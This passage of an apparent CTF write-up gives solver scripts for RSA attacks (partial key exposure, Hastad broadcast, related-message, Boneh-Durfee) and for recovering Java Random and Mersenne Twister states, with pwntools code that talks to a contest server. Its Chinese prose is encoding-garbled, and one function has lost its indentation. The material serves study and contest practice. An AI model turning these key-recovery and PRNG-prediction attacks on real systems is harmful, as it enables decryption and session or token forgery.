beta=<span class="number">0.3</span>)  <span class="comment"># find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.3</span></span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p</span>(<span class="params">d0, kbits, e, n</span>):</span></span><br><span class="line">    X = var(<span class="string">&#x27;X&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        results = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            p = partial_p(p0, kbits, n)</span><br><span class="line">            <span class="keyword">if</span> p:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n=<span class="number">0x77789924c9cee176e8f9ae4a40d29c0a61891d67fc825b6e1570e980a8cb275f138d5f6e118eff6f76673b382cfaaa4f4a9c204ee30d7c887a5c70197bc2701f7f61da8c65e6972398d2842faa51d3274ee99716e56fba888a91263b5e7986363b75c82a86fc9a964aa65b03ede04b4ae0dfb6f96a7fb928e04d092d782148d</span></span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line">    d = <span class="number">0x4bf6610df9dd72df11b3c273d8795b7765374a73e1f3e18abb0af883e1d546cc2fca3ab53e5b18baa228053972472d23e87f411e1f2781faa89ede9bc09b4d53</span></span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    kbits = <span class="number">500</span></span><br><span class="line">    d0 = d &amp; (<span class="number">2</span>^kbits<span class="number">-1</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;lower %d bits (of %d bits) is given&quot;</span> % (kbits, nbits)</span><br><span class="line"></span><br><span class="line">    p = find_p(d0, kbits, e, n)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;found p: %d&quot;</span> % p</span><br><span class="line">    q = n//p</span><br><span class="line">    <span class="built_in">print</span> d</span><br><span class="line">    <span class="built_in">print</span> inverse_mod(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¬¬å››å…³ï¼š</p><p>å¹¿æ’­æ”»å‡»ï¼Œè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span>(<span class="params">mi, ai</span>):</span></span><br><span class="line">    <span class="comment"># mi,aiåˆ†åˆ«è¡¨ç¤ºæ¨¡æ•°å’Œå–æ¨¡åçš„å€¼,éƒ½ä¸ºåˆ—è¡¨ç»“æ„</span></span><br><span class="line">    <span class="keyword">assert</span> (<span class="built_in">isinstance</span>(mi, <span class="built_in">list</span>) <span class="keyword">and</span> <span class="built_in">isinstance</span>(ai, <span class="built_in">list</span>))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> <span class="built_in">zip</span>(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#ä¸æˆç«‹åˆ™ä¸å­˜åœ¨è§£</span></span><br><span class="line">        K = c / d * invert(curm / d, m / d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m / d</span><br><span class="line">n2=<span class="number">0x3d9e0e106474d42db39ba27c96cf830737ee86ee77ff03298f1f0460612e9488e7ad402a1f2aacef1a13c4cf75b457e9957f798fcfdb2d510af2a6fceab71cd64c717df829e755bf8573edda4e98269da9eaf6e89c1c656970c7e1dbf9c0a39b4efcb64c9ba805cc8b22ab90022491abea03cc03ac6a6aabcaa210c30ac00f5fL</span></span><br><span class="line">c1=<span class="number">0x64f9355e681326771f3fdd7d07c46cf493dfd7199b9b16b2d33493c3afd33ef4f35184b75de30e27ab452d3addc2f81e9547d9cb061e9f14396e7387e43e637f2004cc83ad81c0930c144d8587e25330290e808c79730db770934ea034a00223f674a484a0efa0df2d2b649fce492facaa79a6aa9344dd4b5b6e02915c40008aL</span></span><br><span class="line">n1=<span class="number">0x7f084b13487e7e0f2e9d6976cb41e825e0dac9bf13a5712bd1610b17b5c1cec51fe98938f5d4e73e6b9af2f92b95383ed39c6a0be779fdf3275a059e55014bbe4c4dd337b72db18e704d5bbe291d06d9c1b263cdb7719ccd6cf57d812a2a54f369696d04c166617f56b3010e07f98354d05e9116add4281edee2ac32f70fb317L</span></span><br><span class="line">c2=<span class="number">0xf8f04645ea1d7f3aaaea76a17ad8c20c1483c457135d5a29721d11f206fb2b7e17293f0c0b5be7eaf55f1917367881a2c3403b319a22a53336ee4848b6d255e4e26df500ca54c6317611ac1181a739288362a6084a53342032517ea2b623d332264571003af203c9cd2e8269a9933dfacaf50442f298d99d699d3e4c3511bc9L</span></span><br><span class="line">n3=<span class="number">0x6e24ae9edc6e30e5ed4fd5982914bf0d4cba5695a47752858d057f0c20ffc9de7471bea76ac4bd336b51cafc7aeb24f3f76bab3e0ede10b214b1c68584db0abf4c9854ae98ffabb01b503f76604b8dead5520e1c3e6750be75580b683e4630c1f6b5e0575e8be9ecd6a68e16dc1fbb3f60fbb0159ee951c8a858cf6a66d83a53L</span></span><br><span class="line">c3=<span class="number">0x4cf28e0b122c9727cff60c7d71192573c231673cd7742ba18e9e5d391a346bc470e693a308ca65454913569f3d0e5f0f15c62afa2285644fc5b9919c22e87ca8f746eec9cff7b1e97761ae3145e3c007acc603928e3c04d47067c2325070cbdea41c6fca21665eb186f26e3e275c456427bf7da1b5bd325eac16c2710ff5102eL</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">C,N=GCRT([n1,n2,n3],[c1,c2,c3])</span><br><span class="line">m=iroot(C,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span> long_to_bytes(m).encode(<span class="string">&quot;hex&quot;</span>)</span><br></pre></td></tr></table></figure><p>ç¬¬äº”å…³ï¼š</p><p>Related Message Attackï¼Œä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getmessage</span>(<span class="params">a, b, c1, c2, n</span>):</span></span><br><span class="line">    b3 = powmod(b, <span class="number">3</span>, n)</span><br><span class="line">    part1 = b * (c1 + <span class="number">2</span> * c2 - b3) % n</span><br><span class="line">    part2 = a * (c1 - c2 + <span class="number">2</span> * b3) % n</span><br><span class="line">    part2 = invert(part2, n)</span><br><span class="line">    <span class="keyword">return</span> (part1 * part2) % n</span><br><span class="line">n=<span class="number">0x4050e234e683b2527380ea84d391151be80831abcd540f3467a31511d708b0be459725b39581a3d4edcffa856f31b1eca19a37b7e7c34e378bb3ed7e660b4a19d24769497d26aea09eab0e2a2849d006cb4b1f61b6b7ee4c3ec3fc58383e3c6eb2fcfbe9c36343bfe74fec5e952e477bd4493f01a0a81092d680a776b1a555e7L</span></span><br><span class="line">c1=<span class="number">0x3fa7da49d8cbc6fe46bf15b9c35107fc0fe043eb3c94c1b6f214bf3943ed5310cb92e8aea576c6074a518f9a5b7d3de535158146ed3a74a298d98f55712359e795f1e83f253c61344617c5e35933c902fd49e50f37dbac51c23f2a0b954247b8af376444faca957db97f94b42dda469acfc5aab7574a486f6e326bfee0aa420dL</span></span><br><span class="line">c2=<span class="number">0x3edc18248feddad66f95550e3ec77d1de26dd9236824d049587aa567fa52e9290dee4416c78c39adda36b6eb1169df42b68a5cebdb07a784223c07680c3cd64c19f9fb7483d5ab7cd6d7bebf07ae0da0ee91557d9f1bbcbc8b9f7362f37050d718dca8fbd8749ab7dad7a531876fb3db988f3598ed6ce7c9d32102986a68a9a1L</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line"><span class="built_in">print</span> long_to_bytes(getmessage(<span class="number">1</span>,<span class="number">1</span>,c2,c1,n)).encode(<span class="string">&quot;hex&quot;</span>)</span><br></pre></td></tr></table></figure><p>ç¬¬å…­å…³ï¼š</p><p>Boneh and Durfee attackï¼Œä»<a href="https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage">https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage</a>ä¸Šæ”¹çš„ã€‚</p><p>æœ€ç»ˆexpï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span>=[<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">token=<span class="string">&#x27;35561ebb6d2cd5f8f6dddd1c1f60b613&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Pow</span>(<span class="params">part_hex,hash_value</span>):</span></span><br><span class="line">pre=part_hex.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> itertools.product(<span class="built_in">dict</span>,repeat=<span class="number">3</span>):</span><br><span class="line"> i=pre+<span class="string">&#x27;&#x27;</span>.join(s)</span><br><span class="line"> <span class="keyword">if</span> sha256(i).hexdigest()==hash_value:</span><br><span class="line"> <span class="built_in">print</span> <span class="string">&quot;success&quot;</span></span><br><span class="line"> <span class="keyword">return</span> i.encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">r=remote(<span class="string">&quot;119.3.245.36&quot;</span>,<span class="number">12345</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.recvuntil(<span class="string">&quot;.hexdigest()=&quot;</span>)</span><br><span class="line">hash_value=r.recv(<span class="number">64</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;.encode(&#x27;hex&#x27;)=&quot;</span>)</span><br><span class="line">part_hex=r.recv(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span> hash_value,part_hex</span><br><span class="line">result=Pow(part_hex,hash_value)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(result)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;teamtoken:&#x27;</span>,token)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Generating challenge 1\n&quot;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&quot;081db7350876267d03e36e3dd70129e08167e715c6508ac4ee1afbd4992ad0ac8a5021ab1c084f8b087ab72a155989816a263213d624490a8888766ecc472542&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;encode(&#x27;hex&#x27;)=&quot;</span>,<span class="string">&quot;21d2ce15ce3916a5e3b661de35d132dc32bac36de0e8288baa7a1a36207e6e54b643e701445398fee048b0912090996b5924bf36e5765334ef1029eb05ac128e&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;encode(&#x27;hex&#x27;)=&quot;</span>,<span class="string">&quot;0a56f8eff78995a1a80369469acbfa87b8d17c6918bff28246a6a9c0ffa6875b2f33b3399326b6929e49c22bbba63f71b04b0d45a7b1ac808f5dff41475ae5d5&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;encode(&#x27;hex&#x27;)=&quot;</span>,<span class="string">&quot;0f30aba3355b7ead17f6768158fff2ccdc6e66f8123bb283864e70629bfe0db705b68e299e337c3a4ce1596d880b72689bfab8d066e568b00998ad13330f3dad&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;encode(&#x27;hex&#x27;)=&quot;</span>,<span class="string">&quot;499f89d02d2d95427229d369d86d26063465523c49176ffed8786cc7b258cb647f79512cbb9ecab746d8f322f42ae6fd71362ee6e9e6086c34865d626cbab2da&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;encode(&#x27;hex&#x27;)=&quot;</span>,<span class="string">&quot;6b3bb0cdc72a7f2ce89902e19db0fb2c0514c76874b2ca4113b86e6dc128d44cc859283db4ca8b0b5d9ee35032aec8cc8bb96e8c11547915fc9ef05aa2d72b28&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;encode(&#x27;hex&#x27;)=&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9223743-656a555239a7d7c4.png" alt="image.png"></p><h3 id="RANDOMSTUDY"><a href="#RANDOMSTUDY" class="headerlink" title="RANDOMSTUDY"></a>RANDOMSTUDY</h3><p>ç¬¬ä¸€å…³ï¼Œä»¿ç…§æœåŠ¡å™¨ç”Ÿæˆç§å­çš„æ—¶é—´ï¼Œè¿™è¾¹ä¹Ÿç”Ÿæˆä¸ªå¤§æ¦‚çš„æ—¶é—´ï¼Œçˆ†ç ´ï¼š</p><p>ç¬¬äºŒå…³ï¼Œjava random nextint å¯ä»¥é€šè¿‡ç”Ÿæˆçš„ä¸¤ä¸ªæ•°æ¥é¢„æµ‹ç§å­ï¼Œjavaæ–‡ä»¶åœ¨è¿™é‡Œï¼š<a href="https://github.com/fta2012/ReplicatedRandom/blob/master/ReplicatedRandom.java">https://github.com/fta2012/ReplicatedRandom/blob/master/ReplicatedRandom.java</a></p><p>ç®€å•æ”¹ä¸€ä¸‹javaæ–‡ä»¶ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReplicatedRandom</span> <span class="keyword">extends</span> <span class="title">Random</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Replicate the state of a Random using a single value from its nextDouble</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">replicateState</span><span class="params">(<span class="keyword">double</span> nextDouble)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// nextDouble() is generated from ((next(26) &lt;&lt; 27) + next(27)) / (1L &lt;&lt; 53)</span></span><br><span class="line">        <span class="comment">// Inverting those operations will get us the values of next(26) and next(27)</span></span><br><span class="line">        <span class="keyword">long</span> numerator = (<span class="keyword">long</span>)(nextDouble * (<span class="number">1L</span> &lt;&lt; <span class="number">53</span>));</span><br><span class="line">        <span class="keyword">int</span> first26 = (<span class="keyword">int</span>)(numerator &gt;&gt;&gt; <span class="number">27</span>);</span><br><span class="line">        <span class="keyword">int</span> last27 = (<span class="keyword">int</span>)(numerator &amp; ((<span class="number">1L</span> &lt;&lt; <span class="number">27</span>) - <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">return</span> replicateState(first26, <span class="number">26</span>, last27, <span class="number">27</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Replicate the state of a Random using a single value from its nextLong</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">replicateState</span><span class="params">(<span class="keyword">long</span> nextLong)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> last32 = (<span class="keyword">int</span>)(nextLong &amp; ((<span class="number">1L</span> &lt;&lt; <span class="number">32</span>) - <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">int</span> first32 = (<span class="keyword">int</span>)((nextLong - last32) &gt;&gt; <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">return</span> replicateState(first32, <span class="number">32</span>, last32, <span class="number">32</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Replicate the state of a Random using two consecutive values from its nextInt</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">replicateState</span><span class="params">(<span class="keyword">int</span> firstNextInt, <span class="keyword">int</span> secondNextInt)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> replicateState(firstNextInt, <span class="number">32</span>, secondNextInt, <span class="number">32</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Replicate the state of a Random using two consecutive values from its nextFloat</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">replicateState</span><span class="params">(<span class="keyword">float</span> firstNextFloat, <span class="keyword">float</span> secondNextFloat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> replicateState((<span class="keyword">int</span>)(firstNextFloat * (<span class="number">1</span> &lt;&lt; <span class="number">24</span>)), <span class="number">24</span>, (<span class="keyword">int</span>)(secondNextFloat * (<span class="number">1</span> &lt;&lt; <span class="number">24</span>)), <span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">replicateState</span><span class="params">(<span class="keyword">int</span> nextN, <span class="keyword">int</span> n, <span class="keyword">int</span> nextM, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Constants copied from java.util.Random</span></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> multiplier = <span class="number">0x5DEECE66DL</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> addend = <span class="number">0xBL</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> mask = (<span class="number">1L</span> &lt;&lt; <span class="number">48</span>) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> upperMOf48Mask = ((<span class="number">1L</span> &lt;&lt; m) - <span class="number">1</span>) &lt;&lt; (<span class="number">48</span> - m);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// next(x) is generated by taking the upper x bits of 48 bits of (oldSeed * multiplier + addend) mod (mask + 1)</span></span><br><span class="line">        <span class="comment">// So now we have the upper n and m bits of two consecutive calls of next(n) and next(m)</span></span><br><span class="line">        <span class="keyword">long</span> oldSeedUpperN = ((<span class="keyword">long</span>)nextN &lt;&lt; (<span class="number">48</span> - n)) &amp; mask;</span><br><span class="line">        <span class="keyword">long</span> newSeedUpperM = ((<span class="keyword">long</span>)nextM &lt;&lt; (<span class="number">48</span> - m)) &amp; mask;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Bruteforce the lower (48 - n) bits of the oldSeed that was truncated.</span></span><br><span class="line">        <span class="comment">// Calculate the next seed for each guess of oldSeed and check if it has the same top m bits as our newSeed.</span></span><br><span class="line">        <span class="comment">// If it does then the guess is right and we can add that to our candidate seeds.</span></span><br><span class="line">        ArrayList&lt;Long&gt; possibleSeeds = <span class="keyword">new</span> ArrayList&lt;Long&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">long</span> oldSeed = oldSeedUpperN; oldSeed &lt;= (oldSeedUpperN | ((<span class="number">1L</span> &lt;&lt; (<span class="number">48</span> - n)) - <span class="number">1</span>)); oldSeed++) &#123;</span><br><span class="line">            <span class="keyword">long</span> newSeed = (oldSeed * multiplier + addend) &amp; mask;</span><br><span class="line">            <span class="keyword">if</span> ((newSeed &amp; upperMOf48Mask) == newSeedUpperM) &#123;</span><br><span class="line">                possibleSeeds.add(newSeed);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (possibleSeeds.size() == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// If there&#x27;s only one candidate seed, then we found it!</span></span><br><span class="line">            setSeed(possibleSeeds.get(<span class="number">0</span>) ^ multiplier); <span class="comment">// setSeed(x) sets seed to `(x ^ multiplier) &amp; mask`, so we need another `^ multiplier` to cancel it out</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (possibleSeeds.size() &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Didn&#x27;t find a unique seed. Possible seeds were: &quot;</span> + possibleSeeds);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Failed to find seed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i1=Integer.parseInt(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">int</span> i2=Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">        ReplicatedRandom rr = <span class="keyword">new</span> ReplicatedRandom();</span><br><span class="line">        rr.replicateState(i1, i2);</span><br><span class="line">        System.out.println( rr.nextInt());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ä¸€ä¸‹javaæ–‡ä»¶ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡pythonçš„subprocessè°ƒç”¨classæ–‡ä»¶äº†ï¼Œå†æŠŠè¿è¡Œçš„ç»“æœè·å–åˆ°ã€‚</p><p>ç¬¬ä¸‰å…³ï¼šå¯ä»¥é€šè¿‡ç”Ÿæˆçš„éšæœºæ•°åºåˆ—æ¥é¢„æµ‹ï¼Œå‚è€ƒï¼š<a href="https://github.com/kmyk/mersenne-twister-predictor">https://github.com/kmyk/mersenne-twister-predictor</a></p><p>æœ€ç»ˆexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> mt19937predictor <span class="keyword">import</span> MT19937Predictor</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span>=[<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">token=<span class="string">&#x27;35561ebb6d2cd5f8f6dddd1c1f60b613&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Pow</span>(<span class="params">part_hex,hash_value</span>):</span></span><br><span class="line">pre=part_hex.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> itertools.product(<span class="built_in">dict</span>,repeat=<span class="number">3</span>):</span><br><span class="line"> i=pre+<span class="string">&#x27;&#x27;</span>.join(s)</span><br><span class="line"> <span class="keyword">if</span> sha256(i).hexdigest()==hash_value:</span><br><span class="line"> <span class="built_in">print</span> <span class="string">&quot;success&quot;</span></span><br><span class="line"> <span class="keyword">return</span> i.encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&quot;119.3.245.36&quot;</span>,<span class="number">23456</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.recvuntil(<span class="string">&quot;.hexdigest()=&quot;</span>)</span><br><span class="line">hash_value=r.recv(<span class="number">64</span>)</span><br><span 